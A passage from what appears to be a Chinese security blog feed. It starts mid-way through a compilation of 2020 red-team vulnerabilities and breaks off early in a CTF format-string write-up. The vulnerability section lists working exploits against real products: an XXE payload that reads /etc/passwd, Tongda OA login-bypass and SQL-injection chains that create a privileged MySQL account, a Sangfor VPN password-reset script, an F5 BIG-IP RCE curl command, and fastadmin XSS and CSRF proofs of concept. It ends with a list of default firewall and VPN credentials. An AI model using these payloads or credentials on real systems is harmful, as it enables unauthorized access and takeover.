src="/img/HW-Vuln/HW15.png"></p><p>利用漏洞需要登录权限，提供一组默认密码。该漏洞存在于数据源中心未限制添加的jdbc连接参数,从而实现JDBC客户端反序列化。</p><p>1、登录到面板 -&gt; 数据源中心。</p><p><img src="/img/HW-Vuln/HW16.png"></p><p>2、jdbc连接参数就是主角，这里没有限制任意类型的连接串参数。</p><p><img src="/img/HW-Vuln/HW17.png"></p><p>3、将以下数据添加到jdbc连接参数中，就可以直接触发。</p><p><img src="/img/HW-Vuln/HW18.png"></p><p><a href="https://www.anquanke.com/post/id/203086">关于MySQL JDBC客户端反序列化漏洞的相关参考</a>。</p><h3 id="宝塔面板-phpMyadmin-未授权访问"><a href="#宝塔面板-phpMyadmin-未授权访问" class="headerlink" title="宝塔面板 phpMyadmin 未授权访问"></a>宝塔面板 phpMyadmin 未授权访问</h3><p>宝塔默认phpMyadmin端口就是888，而这个漏洞排查方式极其简单，访问<code>172.10.0.121:888/pma</code>。如果宝塔是存在安全问题的版本,那就会直接出现phpMyadmin面板页面。</p><h3 id="Exchange-Server-远程代码执行漏洞-CVE-2020-16875"><a href="#Exchange-Server-远程代码执行漏洞-CVE-2020-16875" class="headerlink" title="Exchange Server 远程代码执行漏洞 [CVE-2020-16875]"></a>Exchange Server 远程代码执行漏洞 [CVE-2020-16875]</h3><p>只需要一个Exchange用户账号，就能在Exchange服务器上执行任意命令。</p><h3 id="PhpStudy-nginx-解析漏洞"><a href="#PhpStudy-nginx-解析漏洞" class="headerlink" title="PhpStudy nginx 解析漏洞"></a>PhpStudy nginx 解析漏洞</h3><p>小皮面板 &lt;&#x3D; 8.1.0.7，其实这个漏洞确实不是phpstudy的问题，而是2017年就出现的nginx解析漏洞。</p><p>利用条件就只需要把php恶意文件上传（oss不算!）到服务器。通过<code>/x.txt/x.php</code>方式访问上传的图片地址就解析了php代码。</p><p><img src="/img/HW-Vuln/HW19.png"></p><h3 id="Apache-Cocoon-XML注入-CVE-2020-11991"><a href="#Apache-Cocoon-XML注入-CVE-2020-11991" class="headerlink" title="Apache Cocoon XML注入 [CVE-2020-11991]"></a>Apache Cocoon XML注入 [CVE-2020-11991]</h3><p>程序使用了StreamGenerator这个方法时，解析从外部请求的xml数据包未做相关的限制，恶意用户就可以构造任意的xml表达式，使服务器解析达到XML注入的安全问题。</p><p>漏洞利用条件有限必须是apacheCocoon且使用了StreamGenerator，也就是说只要传输的数据被解析就可以实现了。</p><p>利用POC：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">replace</span> [<span class="meta">&lt;!ENTITY <span class="keyword">ent</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">userInfo</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">firstName</span>&gt;</span>John<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">lastName</span>&gt;</span><span class="symbol">&amp;ent;</span><span class="tag">&lt;/<span class="name">lastName</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">userInfo</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/HW-Vuln/HW20.png"></p><h3 id="Horde-Groupware-Webmail-Edition-远程命令执行"><a href="#Horde-Groupware-Webmail-Edition-远程命令执行" class="headerlink" title="Horde Groupware Webmail Edition 远程命令执行"></a>Horde Groupware Webmail Edition 远程命令执行</h3><p>来源: <code>https://srcincite.io/pocs/zdi-20-1051.py.txt</code>。</p><h3 id="通达OA任意用户登录"><a href="#通达OA任意用户登录" class="headerlink" title="通达OA任意用户登录"></a>通达OA任意用户登录</h3><ul><li><p>1、首先访问<code>/ispirit/login_code.php</code>获取<code>codeuid</code></p></li><li><p>2、访问<code>/general/login_code_scan.php</code>提交 post 参数：<code>uid=1&amp;codeuid=&#123;9E908086-342B-2A87-B0E9-E573E226302A&#125;</code></p></li></ul><p><img src="/img/HW-Vuln/HW21.png"></p><ul><li>3、最后访问<code>/ispirit/login_code_check.php?codeuid=xxx</code>，这样<code>$_SESSION</code>里就有了登录的信息了。</li></ul><h3 id="通达OA-v11-7-后台SQL注入"><a href="#通达OA-v11-7-后台SQL注入" class="headerlink" title="通达OA v11.7 后台SQL注入"></a>通达OA v11.7 后台SQL注入</h3><p>利用条件：需要登录权限。</p><p><code>/general/hr/manage/query/delete_cascade.php?condition_cascade=select%20if((substr(user(),1,1)=%27r%27),1,power(9999,99))</code></p><p>利用链示例：</p><ul><li>1、添加一个mysql用户：<code>grant all privileges ON mysql.* TO &#39;ateam666&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION</code></li></ul><p><img src="/img/HW-Vuln/HW22.png"></p><ul><li>2、给创建的ateam666账户添加mysql权限</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE `mysql`.`user` SET `Password` = &#x27;*DE0742FA79F6754E99FDB9C8D2911226A5A9051D&#x27;, `Select_priv` = &#x27;Y&#x27;, `Insert_priv` = &#x27;Y&#x27;, `Up</span><br></pre></td></tr></table></figure><ul><li><p>3、刷新数据库就可以登录到数据库：<code>/general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;</code></p></li><li><p>4、通达OA配置mysql默认是不开启外网访问的所以需要修改mysql授权登录：<code>/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO &#39;ateam666&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION</code></p></li><li><p>5、接下来就是mysql提权</p></li></ul><h3 id="Wordpress-File-manager-插件任意文件上传"><a href="#Wordpress-File-manager-插件任意文件上传" class="headerlink" title="Wordpress File-manager 插件任意文件上传"></a>Wordpress File-manager 插件任意文件上传</h3><p><img src="/img/HW-Vuln/HW23.png"></p><p>成功上传后文件访问路径：<code>/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php</code></p><h3 id="Pligg-CMS远程代码执行-CVE-2020-25287"><a href="#Pligg-CMS远程代码执行-CVE-2020-25287" class="headerlink" title="Pligg CMS远程代码执行 [CVE-2020-25287]"></a>Pligg CMS远程代码执行 [CVE-2020-25287]</h3><p>漏洞非常鸡肋需要登录后台，受影响版本为Pligg2.0.3。</p><p><img src="/img/HW-Vuln/HW24.png"></p><p>模版编辑器功能可以编辑任意文件内容，在文件中加入恶意代码导致代码执行。</p><p><img src="/img/HW-Vuln/HW25.png"></p><h3 id="ZeroLogon接管域控权限漏洞-CVE-2020-1472"><a href="#ZeroLogon接管域控权限漏洞-CVE-2020-1472" class="headerlink" title="ZeroLogon接管域控权限漏洞 [CVE-2020-1472]"></a>ZeroLogon接管域控权限漏洞 [CVE-2020-1472]</h3><p>Netlogon远程协议是一个远程过程调用（RPC）接口，用于基于域的网络上的用户和计算机身份验证。Netlogon远程协议RPC接口还用于为备份域控制器（BDC）复制数据库。</p><p>Netlogon远程协议用于维护从域成员到域控制器（DC），域的DC之间以及跨域的DC之间的域关系。此RPC接口用于发现和管理这些关系。</p><p>该漏洞主要是由于在使用Netlogon安全通道与域控进行连接时，由于认证协议加密部分的缺陷，导致攻击者可以将域控管理员用户的密码置为空，从而进一步实现密码hash获取并最终获得管理员权限。成功的利用可以实现以管理员权限登录域控设备，并进一步控制整个域。</p><p>漏洞影响：</p><ul><li><p>Microsoft Windows Server 2008 R2 SP1</p></li><li><p>Microsoft Windows Server 2012</p></li><li><p>Microsoft Windows Server 2012 R2</p></li><li><p>Microsoft Windows Server 2016</p></li><li><p>Microsoft Windows Server 2019</p></li><li><p>Microsoft Windows Server version 2004 (Server Core Installation)</p></li><li><p>Microsoft Windows Server version 1903 (Server Core Installation)</p></li><li><p>Microsoft Windows Server version 1909 (Server Core Installation)</p></li></ul><h3 id="ThinkAdminV6-任意文件操作"><a href="#ThinkAdminV6-任意文件操作" class="headerlink" title="ThinkAdminV6 任意文件操作"></a>ThinkAdminV6 任意文件操作</h3><p>目录遍历，注意POST数据包rules参数值需要URL编码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /admin.html?s=admin/api.Update/node</span><br><span class="line"></span><br><span class="line">rules=%5B%22.%2F%22%5D</span><br></pre></td></tr></table></figure><p><img src="/img/HW-Vuln/HW26.png"></p><p>文件读取，后面那一串是UTF8字符串加密后的结果。计算方式在Update.php中的加密函数。</p><p><code>/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34</code></p><p><img src="/img/HW-Vuln/HW27.png"></p><h3 id="SharePoint远程代码执行-CVE-2020-1181"><a href="#SharePoint远程代码执行-CVE-2020-1181" class="headerlink" title="SharePoint远程代码执行 [CVE-2020-1181]"></a>SharePoint远程代码执行 [CVE-2020-1181]</h3><p>漏洞详情及利用方法见<code>https://www.anquanke.com/post/id/208819</code></p><h3 id="深信服-SSL-VPN-任意密码重置"><a href="#深信服-SSL-VPN-任意密码重置" class="headerlink" title="深信服 SSL VPN 任意密码重置"></a>深信服 SSL VPN 任意密码重置</h3><p>深信服VPN加密算法使用了默认的key，攻击者构利用key构造重置密码数据包从而修改任意用户的密码。利用条件需要登录账号。M7.6.6R1版本默认key为20181118，M7.6.1版本默认key为20100720。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Clipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span><span class="title function_">myRC4</span>(<span class="params">data,key</span>):</span><br><span class="line">    rc41=ARC4.new(key)</span><br><span class="line">    encrypted=rc41.encrypt(data)</span><br><span class="line">    <span class="keyword">return</span> encrypted.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_decrpt_hex</span>(<span class="params">data,key</span>):</span><br><span class="line">    rc41=ARC4.new(key)</span><br><span class="line">    <span class="keyword">return</span> rc41.decrypt(a2b_hex(data))</span><br><span class="line"> </span><br><span class="line">key=<span class="string">&#x27;20200720&#x27;</span></span><br><span class="line">data=<span class="string">r&#x27;,username=TARGET_USERNAME,ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=TARGET_PASSWORD,&#x27;</span> </span><br><span class="line"><span class="built_in">print</span> myRC4(data,key)</span><br></pre></td></tr></table></figure><p><img src="/img/HW-Vuln/HW28.png"></p><p><img src="/img/HW-Vuln/HW29.png"></p><p>len为脚本计算后的结果。</p><h3 id="深信服-SSL-VPN-修改任意账户手机号"><a href="#深信服-SSL-VPN-修改任意账户手机号" class="headerlink" title="深信服 SSL VPN 修改任意账户手机号"></a>深信服 SSL VPN 修改任意账户手机号</h3><p>修改手机号接口未正确鉴权导致越权覆盖任意用户的手机号码，利用条件需要登录账号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://&lt;PATH&gt;/por/changetelnum.csp?apiversion=1</span><br><span class="line"></span><br><span class="line">newtel=TARGET_PHONE&amp;sessReq=clusterd&amp;username=TARGET_USERNAME&amp;grpid=0&amp;sessid=0&amp;ip=127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="/img/HW-Vuln/HW30.png"></p><h3 id="通达OA-v11-6-版本RCE漏洞"><a href="#通达OA-v11-6-版本RCE漏洞" class="headerlink" title="通达OA v11.6 版本RCE漏洞"></a>通达OA v11.6 版本RCE漏洞</h3><ul><li><p><code>https://www.cnblogs.com/yuzly/p/13600532.html</code></p></li><li><p><code>https://github.com/TomAPU/poc_and_exp</code></p></li></ul><h3 id="F5负载均衡-RCE-CVE-2020-5902"><a href="#F5负载均衡-RCE-CVE-2020-5902" class="headerlink" title="F5负载均衡 RCE [CVE-2020-5902]"></a>F5负载均衡 RCE [CVE-2020-5902]</h3><p>版本影响：</p><ul><li><p>BIG-IP 15.x: 15.1.0&#x2F;15.0.0</p></li><li><p>BIG-IP 14.x: 14.1.0 ~ 14.1.2</p></li><li><p>BIG-IP 13.x: 13.1.0 ~ 13.1.3</p></li><li><p>BIG-IP 12.x: 12.1.0 ~ 12.1.5</p></li><li><p>BIG-IP 11.x: 11.6.1 ~ 11.6.5</p></li></ul><p>远程命令执行RCE：<code>curl -v -k &#39;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin&#39;</code></p><p><img src="/img/HW-Vuln/HW31.png"></p><p><img src="/img/HW-Vuln/HW32.png"></p><p><img src="/img/HW-Vuln/HW33.png"></p><p>文件包含漏洞：<code>https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code></p><p><img src="/img/HW-Vuln/HW34.png"></p><h3 id="fastadmin-前台-getshell-csrf-xss"><a href="#fastadmin-前台-getshell-csrf-xss" class="headerlink" title="fastadmin 前台 getshell + csrf + xss"></a>fastadmin 前台 getshell + csrf + xss</h3><h4 id="NO-1-2"><a href="#NO-1-2" class="headerlink" title="NO.1"></a>NO.1</h4><p>需要开启会员中心功能为利用前提条件。登陆会员中心，在个人资料页面中修改个人头像：</p><p><img src="/img/HW-Vuln/HW35.png"></p><p>抓包后修改图片数据（满足图片头格式即可）：</p><p><img src="/img/HW-Vuln/HW36.png"></p><p>记录下路径后，成功getshell：</p><p><img src="/img/HW-Vuln/HW37.png"></p><h4 id="NO-2-2"><a href="#NO-2-2" class="headerlink" title="NO.2"></a>NO.2</h4><p>后台分类管理处存在XSS：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /admin.php/category/add?dialog=1 HTTP/1.1</span><br><span class="line">Host: admin.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 233</span><br><span class="line">Origin: http://admin.com</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://admin.com/admin.php/category/add?dialog=1</span><br><span class="line">Cookie: PHPSESSID=ou6fjfn717lu02rfm9saqguca4; uid=3; token=f824ac8c-ac7b-4979-a89b-b47dd8e79226</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">row%5Btype%5D=default&amp;row%5Bpid%5D=0&amp;row%5Bname%5D=%3Cscript%3Ealert(1)%3C%2Fscript%3E&amp;row%5Bnickname%5D=123&amp;row%5Bimage%5D=1&amp;row%5Bkeywords%5D=123&amp;row%5Bde</span><br></pre></td></tr></table></figure><p><img src="/img/HW-Vuln/HW38.png"></p><h4 id="NO-3-1"><a href="#NO-3-1" class="headerlink" title="NO.3"></a>NO.3</h4><p>还存在CSRF漏洞：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://admin.com/admin.php/category/add?dialog=1&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>type<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;default&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>pid<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>name<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span><span class="symbol">&amp;lt;</span><span class="symbol">&amp;#47;</span>script<span class="symbol">&amp;gt;</span>&quot;</span> /&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>nickname<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>image<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>keywords<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>description<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>weigh<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>status<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;normal&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>flag<span class="symbol">&amp;#93;</span><span class="symbol">&amp;#91;</span><span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h2><p>一些弱口令字典:</p><ul><li><p>泛微OA默认system账号:system&#x2F;system</p></li><li><p>Apache DolphinScheduler:admin&#x2F;dolphinscheduler</p></li><li><p>天融信防火墙 用户名:superman 密码:talent</p></li><li><p>天融信防火墙 用户名:superman 密码:talent!23</p></li><li><p>联想网御防火墙 用户名:admin 密码:leadsec@7766、administrator、bane@7766</p></li><li><p>深信服防火墙 用户名:admin 密码:admin</p></li><li><p>启明星辰 用户名:admin 密码:bane@7766、admin@123</p></li><li><p>juniper 用户名:netscreen 密码:netscreen</p></li><li><p>Cisco 用户名:admin 密码:cisco</p></li><li><p>Huawei 用户名:admin 密码:Admin@123</p></li><li><p>H3C 用户名:admin 密码:admin</p></li><li><p>绿盟IPS 用户名:weboper 密码:weboper</p></li><li><p>网神防火墙GE1 用户名:admin 密码:firewall</p></li><li><p>深信服VPN:51111端口密码:delanrecover</p></li><li><p>华为VPN 账号:root 密码:mduadmin</p></li><li><p>华为防火墙 账号:admin密码:Admin@123</p></li><li><p>迪普 192.168.0.1 默认的用户名和密码(admin&#x2F;admin_default)</p></li><li><p>山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone</p></li><li><p>安恒的明御防火墙 admin&#x2F;adminadmin</p></li><li><p>某堡垒机 shterm&#x2F;shterm</p></li><li><p>天融信的vpn test&#x2F;123456</p></li><li><p>sysauditor&#x2F;sysauditor</p></li><li><p>sysmanager&#x2F;sysmanager</p></li><li><p>supervisor&#x2F;supervisor</p></li><li><p>maintainer&#x2F;maintainer</p></li><li><p>webpolicy&#x2F;webpolicy</p></li><li><p>sysadmin&#x2F;sysadmin</p></li><li><p>conadmin&#x2F;conadmin</p></li><li><p>supervis&#x2F;supervis</p></li><li><p>webaudit&#x2F;webaudit</p></li><li><p>sysadmin&#x2F;sysadmin</p></li><li><p>conadmin&#x2F;nsfocus</p></li><li><p>weboper&#x2F;weboper</p></li><li><p>auditor&#x2F;auditor</p></li><li><p>weboper&#x2F;weboper</p></li><li><p>nsadmin&#x2F;nsadmin</p></li><li><p>admin&#x2F;nsfocus</p></li><li><p>admin&#x2F;admin</p></li><li><p>shell&#x2F;shell</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Vulnerabilities </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>61DCTF fm の Write-Up</title>
      <link href="/2020/09/08/61DCTF-fm/"/>
      <url>/2020/09/08/61DCTF-fm/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>程序运行截图：</p><p><img src="/img/fm/fm1.png"></p><span id="more"></span><p>checksec发现存在Canary以及DEP保护：</p><p><img src="/img/fm/fm2.png"></p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>将程序通过IDA打开，首先是main函数：</p><p><img src="/img/fm/fm3.png"></p><p>可以看到主函数里就已经存在<code>system(&quot;/bin/sh&quot;)</code>的语句，基本思路当然要满足跳转条件，执行该语句。</p><p>根据运行结果可以知道这个<code>x</code>在程序中被定为3，我们需要将其改为4。而在<code>printf(&amp;buf)</code>这里存在典型的格式化字符串漏洞，通过该漏洞可以实现任意内存写入。</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>解题关键在于了解格式化字符串漏洞，而在了解这个漏洞之前，首先要了解一下printf函数（其他函数类似sprintf、fprintf等print家族函数都会存在同样的问题）。</p><p>printf函数用法是<code>printf(“格式化字符串”, 参数…)</code>，函数返回值是int类型，返回正确输出的字符个数。如果输出失败，返回负值。参数个数不确定，可以是多个，也可以没有参数。</p><p>prtintf函数的格式化字符串常见的有下面几种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">%a  浮点数、十六进制数字和p-记数法（c99</span><br><span class="line">%A  浮点数、十六进制数字和p-记法（c99）</span><br><span class="line">%c  一个字符(char)</span><br><span class="line">%C  一个ISO宽字符</span><br><span class="line">%d  有符号十进制整数(int)（%ld、%Ld：长整型数据(long),%hd：输出短整形。）　</span><br><span class="line">%e  浮点数、e-记数法</span><br><span class="line">%E  浮点数、E-记数法</span><br><span class="line">%f  单精度浮点数(默认float)、十进制记数法（%.nf  这里n表示精确到小数位后n位.十进制计数）</span><br><span class="line">%g  根据数值不同自动选择%f或%e．</span><br><span class="line">%G  根据数值不同自动选择%f或%e.</span><br><span class="line">%i  有符号十进制数（与%d相同）</span><br><span class="line">%o  无符号八进制整数</span><br><span class="line">%p  指针</span><br><span class="line">%s  对应字符串char*（%s = %hs = %hS 输出 窄字符）</span><br><span class="line">%S  对应宽字符串WCAHR*（%ws = %S 输出宽字符串）</span><br><span class="line">%u  无符号十进制整数(unsigned int)</span><br><span class="line">%x  使用十六进制数字0xf的无符号十六进制整数　</span><br><span class="line">%X  使用十六进制数字0xf的无符号十六进制整数</span><br><span class="line">%%  打印一个百分号</span><br></pre></td></tr></table></figure><p>还有不常见的%n，会将%n之前打印出来的字符个数赋值给一个变量。此外还有%hn（写入目标空间2字节），%hhn（写入目标空间1字节），%lln（写入目标空间8字节）。</p><p>例如这样一个程序：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>()</span>&#123;</span><br><span class="line">  <span class="built_in">int</span> n = <span class="number">0</span>;</span><br><span class="line">  printf(<span class="string">&quot;test%n\n&quot;</span>, &amp;n);</span><br><span class="line">  printf(<span class="string">&quot;n is %d\n&quot;</span>, n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序编译运行之后输出的n是4。</p><p>接下来就可以去了解一下格式化字符串漏洞了。正确的printf函数用法应该是这样的：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>()</span>&#123;</span><br><span class="line">  <span class="built_in">int</span> n = <span class="number">6</span>;</span><br><span class="line">  printf(<span class="string">&quot;%d\n&quot;</span>, n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而有时候也会被省略成这样：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>()</span>&#123;</span><br><span 